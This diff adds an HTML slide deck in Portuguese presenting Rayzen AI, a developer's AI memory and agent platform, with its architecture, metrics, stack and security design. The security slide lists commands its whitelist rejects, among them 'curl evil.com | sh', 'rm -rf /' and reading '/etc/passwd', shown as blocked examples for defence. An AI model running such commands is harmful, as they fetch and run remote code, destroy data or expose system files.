@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rayzen AI</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:        #080808;
+  --surface:   #111;
+  --card:      #161616;
+  --border:    rgba(255,255,255,0.07);
+  --border-hi: rgba(255,255,255,0.13);
+  --blue:      #3b82f6;
+  --blue-dim:  rgba(59,130,246,0.15);
+  --blue-line: rgba(59,130,246,0.35);
+  --text:      #f0f0f0;
+  --text-2:    #888;
+  --text-3:    #555;
+  --red:       #f87171;
+  --green:     #4ade80;
+  --mono: 'SF Mono', 'Fira Code', 'Cascadia Code', ui-monospace, monospace;
+  --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', sans-serif;
+}
+
+html, body { width: 100%; height: 100%; background: var(--bg); color: var(--text); font-family: var(--sans); overflow: hidden; }
+
+/* ── dot grid bg ───────────────────────── */
+body::before {
+  content: '';
+  position: fixed; inset: 0; z-index: 0;
+  background-image: radial-gradient(circle, rgba(255,255,255,0.055) 1px, transparent 1px);
+  background-size: 28px 28px;
+  pointer-events: none;
+}
+
+/* ── slides ────────────────────────────── */
+#deck { position: relative; width: 100vw; height: 100vh; z-index: 1; }
+
+.slide {
+  position: absolute; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  padding: 60px 80px;
+  opacity: 0; pointer-events: none;
+  transition: opacity .45s ease, transform .45s ease;
+  transform: translateY(12px);
+}
+.slide.active { opacity: 1; pointer-events: auto; transform: translateY(0); }
+.slide.exit   { opacity: 0; transform: translateY(-12px); }
+
+/* ── progress ──────────────────────────── */
+#progress-bar {
+  position: fixed; bottom: 0; left: 0; height: 2px;
+  background: var(--blue); z-index: 100;
+  transition: width .35s ease;
+}
+#slide-counter {
+  position: fixed; bottom: 18px; right: 28px;
+  font-family: var(--mono); font-size: 11px; color: var(--text-3);
+  z-index: 100; letter-spacing: .08em;
+}
+#nav-hint {
+  position: fixed; bottom: 18px; left: 28px;
+  font-size: 11px; color: var(--text-3);
+  z-index: 100; letter-spacing: .04em;
+}
+
+/* ── logo svg ──────────────────────────── */
+.logo-mark { display: inline-block; vertical-align: middle; }
+
+/* ── typography ────────────────────────── */
+.eyebrow {
+  font-family: var(--mono); font-size: 11px; font-weight: 500;
+  letter-spacing: .18em; text-transform: uppercase;
+  color: var(--blue); margin-bottom: 16px;
+}
+.headline {
+  font-size: clamp(32px, 4.5vw, 58px); font-weight: 800;
+  line-height: 1.1; letter-spacing: -.03em; color: var(--text);
+}
+.headline span { color: var(--blue); }
+.sub {
+  font-size: clamp(14px, 1.4vw, 18px); color: var(--text-2);
+  line-height: 1.6; margin-top: 18px; max-width: 620px;
+}
+.mono { font-family: var(--mono); }
+
+/* ── cards & grids ─────────────────────── */
+.card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; padding: 22px 26px;
+}
+.card:hover { border-color: var(--border-hi); }
+
+.metric-grid {
+  display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;
+  width: 100%; margin-top: 32px;
+}
+.metric-card {
+  background: var(--card); border: 1px solid var(--border);
+  border-radius: 10px; padding: 24px 20px;
+  display: flex; flex-direction: column; gap: 6px;
+}
+.metric-card .num {
+  font-family: var(--mono); font-size: 42px; font-weight: 700;
+  color: var(--blue); line-height: 1;
+}
+.metric-card .label { font-size: 12px; color: var(--text-2); letter-spacing: .04em; }
+.metric-card .desc  { font-size: 11px; color: var(--text-3); margin-top: 2px; }
+
+/* ── two-col ───────────────────────────── */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; width: 100%; margin-top: 28px; }
+.col-bad  { border-color: rgba(248,113,113,.25); }
+.col-bad  .col-head { color: var(--red); }
+.col-good { border-color: var(--blue-line); }
+.col-good .col-head { color: var(--blue); }
+.col-head { font-family: var(--mono); font-size: 12px; letter-spacing: .12em; text-transform: uppercase; margin-bottom: 14px; }
+.col-item { font-size: 14px; color: var(--text-2); padding: 8px 0; border-bottom: 1px solid var(--border); display: flex; align-items: flex-start; gap: 10px; }
+.col-item:last-child { border-bottom: none; }
+.col-item .icon { opacity: .7; font-size: 13px; flex-shrink: 0; margin-top: 1px; }
+
+/* ── arch flow ─────────────────────────── */
+.arch-row { display: flex; align-items: center; justify-content: center; gap: 0; width: 100%; margin-top: 28px; flex-wrap: nowrap; }
+.arch-node {
+  background: var(--card); border: 1px solid var(--border-hi);
+  border-radius: 8px; padding: 14px 18px; text-align: center; min-width: 110px;
+}
+.arch-node .node-label { font-size: 12px; font-weight: 600; color: var(--text); letter-spacing: .02em; }
+.arch-node .node-sub   { font-size: 10px; color: var(--text-3); margin-top: 4px; font-family: var(--mono); }
+.arch-node.accent { border-color: var(--blue-line); background: var(--blue-dim); }
+.arch-arrow { color: var(--text-3); font-size: 16px; padding: 0 10px; flex-shrink: 0; }
+
+/* ── stack badges ──────────────────────── */
+.badge-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 28px; }
+.badge {
+  background: var(--card); border: 1px solid var(--border-hi);
+  border-radius: 6px; padding: 8px 14px;
+  font-family: var(--mono); font-size: 12px; color: var(--text-2);
+  letter-spacing: .04em;
+}
+.badge.hi { border-color: var(--blue-line); color: #93c5fd; background: var(--blue-dim); }
+
+/* ── sec items ─────────────────────────── */
+.sec-list { margin-top: 24px; display: flex; flex-direction: column; gap: 14px; }
+.sec-item {
+  display: grid; grid-template-columns: 36px 1fr; align-items: start; gap: 16px;
+}
+.sec-icon {
+  width: 36px; height: 36px; border-radius: 8px;
+  background: var(--blue-dim); border: 1px solid var(--blue-line);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px; flex-shrink: 0;
+}
+.sec-title { font-size: 14px; font-weight: 600; color: var(--text); }
+.sec-desc  { font-size: 12px; color: var(--text-2); margin-top: 3px; line-height: 1.5; }
+
+/* ── code block ────────────────────────── */
+.code-block {
+  background: #0d0d0d; border: 1px solid var(--border-hi);
+  border-radius: 8px; padding: 16px 20px; margin-top: 16px;
+  font-family: var(--mono); font-size: 12px; color: #94a3b8;
+  line-height: 1.7;
+}
+.code-block .kw  { color: #7dd3fc; }
+.code-block .str { color: #86efac; }
+.code-block .cmt { color: #475569; }
+
+/* ── cta ───────────────────────────────── */
+.cta-box {
+  border: 1px solid var(--blue-line);
+  background: var(--blue-dim); border-radius: 12px;
+  padding: 28px 36px; margin-top: 24px; text-align: center;
+}
+.cta-box .cta-main { font-size: 22px; font-weight: 700; color: var(--text); }
+.cta-box .cta-sub  { font-size: 14px; color: var(--text-2); margin-top: 8px; font-family: var(--mono); }
+
+/* ── title slide extras ────────────────── */
+.title-brand {
+  display: flex; align-items: center; gap: 18px; margin-bottom: 28px;
+}
+.title-name { font-family: var(--mono); font-size: 13px; letter-spacing: .22em; color: var(--blue); text-transform: uppercase; }
+.divider { width: 48px; height: 2px; background: var(--blue); border-radius: 1px; margin: 24px 0; }
+.tag-row { display: flex; gap: 10px; margin-top: 32px; flex-wrap: wrap; }
+.tag { font-family: var(--mono); font-size: 11px; color: var(--text-3); border: 1px solid var(--border); border-radius: 4px; padding: 4px 10px; letter-spacing: .06em; }
+
+/* narrow layout */
+.narrow { max-width: 780px; width: 100%; }
+.wide   { max-width: 1100px; width: 100%; }
+</style>
+</head>
+<body>
+
+<!-- SVG logo inline (reutilizado) -->
+<svg style="display:none">
+  <symbol id="rayzen-icon" viewBox="0 0 100 100" fill="none">
+    <defs>
+      <radialGradient id="cg2" cx="36%" cy="30%" r="65%">
+        <stop offset="0%" stop-color="#93c5fd"/>
+        <stop offset="100%" stop-color="#1d4ed8"/>
+      </radialGradient>
+      <filter id="glow2" x="-50%" y="-50%" width="200%" height="200%">
+        <feGaussianBlur in="SourceGraphic" stdDeviation="3" result="b"/>
+        <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+      </filter>
+    </defs>
+    <path d="M50 15 L80 68 L20 68 Z" stroke="#3b82f6" stroke-width="1.5" stroke-linejoin="round" opacity="0.2"/>
+    <line x1="50" y1="50" x2="50" y2="15" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" opacity="0.6"/>
+    <line x1="50" y1="50" x2="80" y2="68" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" opacity="0.6"/>
+    <line x1="50" y1="50" x2="20" y2="68" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" opacity="0.6"/>
+    <circle cx="50" cy="15" r="7" fill="none" stroke="#3b82f6" stroke-width="1.8"/>
+    <circle cx="80" cy="68" r="7" fill="none" stroke="#3b82f6" stroke-width="1.8"/>
+    <circle cx="20" cy="68" r="7" fill="none" stroke="#3b82f6" stroke-width="1.8"/>
+    <circle cx="50" cy="50" r="13" fill="url(#cg2)" filter="url(#glow2)"/>
+  </symbol>
+</svg>
+
+<div id="deck">
+
+  <!-- ══ SLIDE 1 — TITLE ══ -->
+  <div class="slide active" data-slide="1">
+    <div class="narrow" style="text-align:left">
+      <div class="title-brand">
+        <svg class="logo-mark" width="52" height="52"><use href="#rayzen-icon"/></svg>
+        <span class="title-name">Rayzen AI</span>
+      </div>
+      <div class="headline">Memória. Contexto.<br>Execução.</div>
+      <div class="divider"></div>
+      <p class="sub">A plataforma de IA que acompanha cada sessão de trabalho, registra decisões, mantém artefatos atualizados e executa ações no PC — sem esquecer o que aconteceu ontem.</p>
+      <div class="tag-row">
+        <span class="tag">TypeScript 100%</span>
+        <span class="tag">NestJS · Next.js</span>
+        <span class="tag">pgvector</span>
+        <span class="tag">Claude + Groq</span>
+        <span class="tag">198 testes · CI verde</span>
+        <span class="tag">Produção · VPS Azure</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 2 — PROBLEMA ══ -->
+  <div class="slide" data-slide="2">
+    <div class="wide">
+      <div class="eyebrow">O Problema</div>
+      <div class="headline">IA esquece.<br>Projetos <span>não podem.</span></div>
+      <div class="two-col" style="margin-top:32px">
+        <div class="card col-bad">
+          <div class="col-head">Sem Rayzen</div>
+          <div class="col-item"><span class="icon">✗</span>Cada sessão começa do zero</div>
+          <div class="col-item"><span class="icon">✗</span>Você re-explica contexto repetidamente</div>
+          <div class="col-item"><span class="icon">✗</span>Decisões arquiteturais se perdem</div>
+          <div class="col-item"><span class="icon">✗</span>Docs ficam desatualizados</div>
+          <div class="col-item"><span class="icon">✗</span>Agente não sabe o que foi feito</div>
+        </div>
+        <div class="card col-good">
+          <div class="col-head">Com Rayzen</div>
+          <div class="col-item"><span class="icon">→</span>Retomada com estado completo do projeto</div>
+          <div class="col-item"><span class="icon">→</span>Eventos capturados automaticamente via hook</div>
+          <div class="col-item"><span class="icon">→</span>Log de decisões persistido com contexto</div>
+          <div class="col-item"><span class="icon">→</span>5 docs regenerados após cada checkpoint</div>
+          <div class="col-item"><span class="icon">→</span>Agente sabe onde parou</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 3 — ARQUITETURA ══ -->
+  <div class="slide" data-slide="3">
+    <div class="wide">
+      <div class="eyebrow">Arquitetura</div>
+      <div class="headline">Um loop fechado<br>entre <span>código e contexto.</span></div>
+      <div class="arch-row" style="margin-top:40px">
+        <div class="arch-node accent">
+          <div class="node-label">Claude Code</div>
+          <div class="node-sub">Edit / Write / Bash</div>
+        </div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-node">
+          <div class="node-label">Hook</div>
+          <div class="node-sub">evento + git context</div>
+        </div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-node accent">
+          <div class="node-label">API NestJS</div>
+          <div class="node-sub">28 módulos</div>
+        </div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-node">
+          <div class="node-label">Memory</div>
+          <div class="node-sub">pgvector 1024d</div>
+        </div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-node accent">
+          <div class="node-label">Agent</div>
+          <div class="node-sub">33 ações PC</div>
+        </div>
+        <div class="arch-arrow">→</div>
+        <div class="arch-node">
+          <div class="node-label">5 Docs</div>
+          <div class="node-sub">auto-gerados</div>
+        </div>
+      </div>
+      <p class="sub" style="margin-top:28px; font-size:13px">Cada ação do Claude Code dispara o hook → evento enriquecido com contexto git → armazenado na API → checkpoint sintetiza e regenera toda a documentação em background.</p>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 4 — MÉTRICAS ══ -->
+  <div class="slide" data-slide="4">
+    <div class="wide">
+      <div class="eyebrow">Números reais · Projeto ativo</div>
+      <div class="headline">Produção.<br><span>Não proof-of-concept.</span></div>
+      <div class="metric-grid">
+        <div class="metric-card">
+          <div class="num">86+</div>
+          <div class="label">Eventos capturados</div>
+          <div class="desc">Automaticamente via hook do Claude Code</div>
+        </div>
+        <div class="metric-card">
+          <div class="num">33</div>
+          <div class="label">Ações whitelistadas</div>
+          <div class="desc">Git, Docker, testes, screenshots, Outlook</div>
+        </div>
+        <div class="metric-card">
+          <div class="num">198</div>
+          <div class="label">Testes · CI verde</div>
+          <div class="desc">Unit + E2E + Agent safety</div>
+        </div>
+        <div class="metric-card">
+          <div class="num">5</div>
+          <div class="label">Docs vivos</div>
+          <div class="desc">Regenerados automaticamente a cada checkpoint</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 5 — SEGURANÇA ══ -->
+  <div class="slide" data-slide="5">
+    <div class="wide" style="display:grid; grid-template-columns:1fr 1fr; gap:60px; align-items:start">
+      <div>
+        <div class="eyebrow">Segurança</div>
+        <div class="headline" style="font-size:clamp(26px,3vw,42px)">Segurança não foi<br><span>afterthought.</span></div>
+        <p class="sub" style="font-size:13px; margin-top:14px">Foi o primeiro módulo com testes escritos. Whitelist inegociável — ações fora são rejeitadas silenciosamente.</p>
+        <div class="sec-list">
+          <div class="sec-item">
+            <div class="sec-icon">🔒</div>
+            <div><div class="sec-title">Whitelist de comandos</div><div class="sec-desc">Apenas 33 ações explicitamente permitidas. Qualquer comando fora da lista é bloqueado antes de executar.</div></div>
+          </div>
+          <div class="sec-item">
+            <div class="sec-icon">🛡</div>
+            <div><div class="sec-title">Path traversal bloqueado</div><div class="sec-desc">Toda operação de arquivo passa por sandbox de diretório. <code style="font-family:var(--mono);font-size:11px;color:#7dd3fc">../</code> bloqueado em todas as ações.</div></div>
+          </div>
+          <div class="sec-item">
+            <div class="sec-icon">⚡</div>
+            <div><div class="sec-title">Dry-run para ações de risco</div><div class="sec-desc">Ações de risco médio/alto descrevem o que fariam antes de executar.</div></div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="code-block">
+<span class="cmt">// apps/agent/src/security/whitelist.ts</span>
+
+<span class="kw">export const</span> ALLOWED_ACTIONS = <span class="kw">new</span> Set([
+  <span class="str">'jarvis:git_status'</span>,
+  <span class="str">'jarvis:git_commit'</span>,    <span class="cmt">// dryRun</span>
+  <span class="str">'jarvis:run_command'</span>,    <span class="cmt">// whitelisted cmds</span>
+  <span class="str">'jarvis:run_tests'</span>,
+  <span class="str">'jarvis:docker_ps'</span>,
+  <span class="str">'jarvis:screenshot'</span>,
+  <span class="cmt">// ... 27 mais</span>
+])
+
+<span class="cmt">// rm -rf / → rejeitado</span>
+<span class="cmt">// curl evil.com | sh → rejeitado</span>
+<span class="cmt">// shutdown → rejeitado</span>
+<span class="cmt">// /etc/passwd → rejeitado</span>
+        </div>
+        <div style="margin-top:14px; font-family:var(--mono); font-size:11px; color:var(--text-3)">
+          <span style="color:var(--green)">✓</span> 198 testes &nbsp;·&nbsp;
+          <span style="color:var(--green)">✓</span> whitelist.spec.ts &nbsp;·&nbsp;
+          <span style="color:var(--green)">✓</span> run-command-safety.spec.ts
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 6 — STACK ══ -->
+  <div class="slide" data-slide="6">
+    <div class="wide">
+      <div class="eyebrow">Stack Técnica</div>
+      <div class="headline">Escolhas deliberadas.<br><span>Sem over-engineering.</span></div>
+      <div class="badge-grid">
+        <span class="badge hi">NestJS 10</span>
+        <span class="badge hi">Next.js 16</span>
+        <span class="badge hi">TypeScript 100%</span>
+        <span class="badge hi">pgvector 1024d</span>
+        <span class="badge hi">LiteLLM proxy</span>
+        <span class="badge">PostgreSQL 16</span>
+        <span class="badge">Redis 7 + BullMQ</span>
+        <span class="badge">Claude Sonnet</span>
+        <span class="badge">Groq llama-3.3-70b</span>
+        <span class="badge">Jina Embeddings</span>
+        <span class="badge">React Flow v12</span>
+        <span class="badge">Puppeteer 22</span>
+        <span class="badge">Prisma 5 · 21 models</span>
+        <span class="badge">Docker Compose v2</span>
+        <span class="badge">Azure VPS Ubuntu</span>
+        <span class="badge hi">pnpm workspaces</span>
+      </div>
+      <div style="margin-top:32px; display:grid; grid-template-columns:repeat(3,1fr); gap:16px">
+        <div class="card" style="padding:16px 20px">
+          <div style="font-size:11px; color:var(--text-3); font-family:var(--mono); margin-bottom:6px">LLM ROUTING</div>
+          <div style="font-size:13px; color:var(--text-2)">gpt-4o → Groq (primário) + Claude Sonnet (fallback automático)</div>
+        </div>
+        <div class="card" style="padding:16px 20px">
+          <div style="font-size:11px; color:var(--text-3); font-family:var(--mono); margin-bottom:6px">MCP SERVER</div>
+          <div style="font-size:13px; color:var(--text-2)">13 tools via HTTP/SSE — conecta ao Claude Desktop</div>
+        </div>
+        <div class="card" style="padding:16px 20px">
+          <div style="font-size:11px; color:var(--text-3); font-family:var(--mono); margin-bottom:6px">MONOREPO</div>
+          <div style="font-size:13px; color:var(--text-2)">API + Web + Agent + Packages em pnpm workspaces</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ SLIDE 7 — CTA ══ -->
+  <div class="slide" data-slide="7">
+    <div class="narrow" style="text-align:center">
+      <svg class="logo-mark" width="64" height="64" style="margin-bottom:24px"><use href="#rayzen-icon"/></svg>
+      <div class="headline" style="text-align:center">Construído solo.<br><span>Em produção.</span></div>
+      <p class="sub" style="text-align:center; margin:18px auto 0">QA Automation Engineer · Full-stack Developer<br>O Rayzen é o que eu uso pra trabalhar melhor.</p>
+      <div class="cta-box">
+        <div class="cta-main">github.com/marcelorayzen/Rayzen-AI</div>
+        <div class="cta-sub">TypeScript · NestJS · Next.js · pgvector · 33 ações · 198 testes</div>
+      </div>
+      <div class="tag-row" style="justify-content:center; margin-top:20px">
+        <span class="tag">Marcelo Rayzen</span>
+        <span class="tag">linkedin.com/in/marcelorayzen</span>
+      </div>
+    </div>
+  </div>
+
+</div><!-- #deck -->
+
+<div id="progress-bar" style="width:14.28%"></div>
+<div id="slide-counter">1 / 7</div>
+<div id="nav-hint">← → · Space · clique para navegar</div>
+
+<script>
+const slides = document.querySelectorAll('.slide')
+const total  = slides.length
+let cur = 0
+
+function go(n) {
+  slides[cur].classList.remove('active')
+  slides[cur].classList.add('exit')
+  setTimeout(() => slides[cur < total ? cur : cur].classList.remove('exit'), 450)
+  cur = (n + total) % total
+  slides[cur].classList.add('active')
+  document.getElementById('progress-bar').style.width = ((cur + 1) / total * 100) + '%'
+  document.getElementById('slide-counter').textContent = (cur + 1) + ' / ' + total
+}
+
+document.addEventListener('keydown', e => {
+  if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'ArrowDown') { e.preventDefault(); go(cur + 1) }
+  if (e.key === 'ArrowLeft'  || e.key === 'ArrowUp')  { e.preventDefault(); go(cur - 1) }
+  if (e.key === 'Home') go(0)
+  if (e.key === 'End')  go(total - 1)
+})
+
+document.getElementById('deck').addEventListener('click', () => go(cur + 1))
+
+// touch swipe
+let tx = 0
+document.addEventListener('touchstart', e => { tx = e.touches[0].clientX })
+document.addEventListener('touchend',   e => {
+  const dx = e.changedTouches[0].clientX - tx
+  if (Math.abs(dx) > 40) go(dx < 0 ? cur + 1 : cur - 1)
+})
+</script>
+</body>
+</html>
